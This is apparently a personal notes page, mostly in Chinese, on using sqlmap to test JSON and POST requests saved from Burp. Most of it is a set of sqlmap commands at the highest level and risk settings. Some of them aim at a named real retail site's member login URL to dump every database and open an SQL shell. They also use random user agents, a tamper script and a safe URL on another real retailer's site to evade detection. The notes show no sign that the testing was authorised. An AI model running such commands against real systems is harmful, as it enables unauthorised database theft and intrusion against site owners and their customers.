---
date: 2022-07-06
modified: 2022-07-08
---
---
parrent: [[sqlmap]]
---# sqlmap JSON/POST
從 burp 將整個 request 存成 txt
手動在 Host: 後綴加上 `:443` 用以指定 https
手動在要測試的參數的值，後綴加上 `*` 用以指定參數
`-r REQUESTFILE      Load HTTP request from a file`
```shell
$ sqlmap -r loginRequest2.txt -T4 --random-agent --current-db --dbs --tables --dump --level 5 --risk 3 --threads 10 --sql-shell --dbms=Mysql
```

使用帶 json 的，sqlmap 不支援 `-p` 指定參數，必須用星號

```shell
sqlmap -u https://www.caco.com.tw/security/memberidentify/login --data="id=ddf" -p "id" -T5 -v3 --level 5 --risk 3  --tables --dump-all --sql-shell --force-ssl

sqlmap -u https://www.caco.com.tw/security/memberidentify/login --data="id=ddf" -p "id" -T4 -v3 --level 5 --risk 3 --random-agent --force-ssl --tables --dump-all --hex

sqlmap -u https://www.caco.com.tw/security/memberidentify/login --data="id=ddf" -p "id" -T4 -v3 --level 5 --risk 3 --random-agent --force-ssl --fresh-queries --tables --dump-all --no-cast

sqlmap -r try3woutstar.txt -T4 --random-agent --force-ssl --banner --current-db --dbs --tables --dump-all --level 5 --risk 3 --threads 10 --sql-shell --fresh-queries --proxy="http://192.168.3.19:9527" -v 3 --randomize

sqlmap -r 1.txt -v 3 -T4 --force-ssl --banner --dbs --tables --dump-all --level 5 --risk 3 --threads 10 --sql-shell --proxy="http://192.168.3.19:9527"

sqlmap -r try3.txt -T6 --random-agent --force-ssl --banner --current-db --dbs --tables --dump-all --level 5 --risk 3 --threads 10 --sql-shell --dbms=Mysql --fresh-queries --no-cast --proxy="http://192.168.3.19:9527" -v 3 --safe-url="https://www.uniqlo.com" --safe-freq 10 --randomize --tamper="space2mysqlblank.py"

sqlmap -r try3.txt -T4 -v3 --level 5 --risk 3  --tables --dump-all 

```
[SQLMap - Cheetsheat - HackTricks](https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap)

-   --safe-url: 隔一会就访问一下的安全URL
-   --safe-post: 访问安全URL时携带的POST数据
-   --safe-req: 从文件中载入安全HTTP请求
-   --safe-freq: 每次测试请求之后都会访问一下的安全URL


AND boolean based found reflective values
![[2022-07-07_12-28.png]]